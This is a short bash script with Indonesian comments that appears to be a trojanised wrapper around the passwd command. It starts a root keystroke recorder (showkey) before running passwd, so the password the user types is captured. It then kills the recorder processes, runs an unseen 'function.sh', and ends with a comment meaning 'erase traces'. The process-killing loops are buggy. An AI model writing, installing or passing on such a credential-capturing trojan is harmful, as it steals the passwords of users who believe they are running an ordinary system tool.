#!/bin/bash

# start record
FOLDER="kelompokkucing"
sudo /opt/$FOLDER/recorder.sh

# run passwd
/usr/bin/passwd

# stop record
let counter=0
for TARGET in $(ps aux | grep root | grep showkey);do
    if [[ $counter = 1 ]]
    then
        kill -17 $TARGET
    fi
    ((counter++))
done
for TARGET in $(ps aux | grep root | grep recorder);do
    if [[ $counter = 1 ]]
    then
        kill -9 $TARGET
    fi
    ((counter++))
done
for TARGET in $(ps aux | grep root | grep showkey);do
    if [[ $counter = 1 ]]
    then
        kill -9 $TARGET
    fi
    ((counter++))
done
# 
/opt/$FOLDER/function.sh

# hapus jejak